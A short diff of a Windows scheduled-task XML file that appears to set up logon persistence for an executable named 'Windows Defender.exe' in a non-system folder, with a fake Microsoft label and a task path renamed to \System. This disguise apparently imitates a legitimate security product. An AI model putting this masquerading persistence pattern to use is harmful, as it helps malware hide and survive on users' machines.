@@ -3,14 +3,10 @@
   <RegistrationInfo>
     <Date>2023-04-19T16:49:14.6182</Date>
     <Author>Author</Author>
-    <URI>\URI</URI>
+    <URI>\System</URI>
   </RegistrationInfo>
-  <Triggers>
+   <Triggers>
     <LogonTrigger>
-      <Repetition>
-        <Interval>PT10M</Interval>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
       <Enabled>true</Enabled>
       <UserId>Computername\Username</UserId>
     </LogonTrigger>
@@ -44,7 +40,7 @@
   <Actions Context="Author">
     <Exec>
       <Command>"environment\Windows Defender.exe"</Command>
-      <Arguments>-P"rofile of Windows Defender [Microsoft Corporation]"</Arguments>
+        <Arguments>-P"rofile of Windows Defender [Microsoft Corporation]"</Arguments>
     </Exec>
   </Actions>
 </Task>
